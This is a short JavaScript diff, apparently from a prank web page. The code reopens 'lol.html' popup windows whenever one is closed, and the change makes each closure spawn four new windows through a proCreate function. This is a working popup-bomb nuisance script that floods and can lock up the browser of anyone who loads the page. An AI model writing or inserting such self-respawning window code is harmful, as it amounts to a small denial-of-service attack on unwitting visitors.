@@ -57,9 +57,7 @@ function openWindow(url) {
   
             if (aWindow.closed) {  
                 clearInterval(timer);  
-                const countToOpen = Math.max(1, openWindows.length);  
-                for (let i = 0; i < countToOpen; i++) {  
-                    openWindow('lol.html');  
+                proCreate() 
                 }  
             }  
         }, 40);  
@@ -67,7 +65,7 @@ function openWindow(url) {
 }  
   
 function proCreate() {  
-    for (let i = 0; i < 5; i++) {  
+    for (let i = 0; i < 4; i++) {  
         openWindow('lol.html');  
     }  
 }  
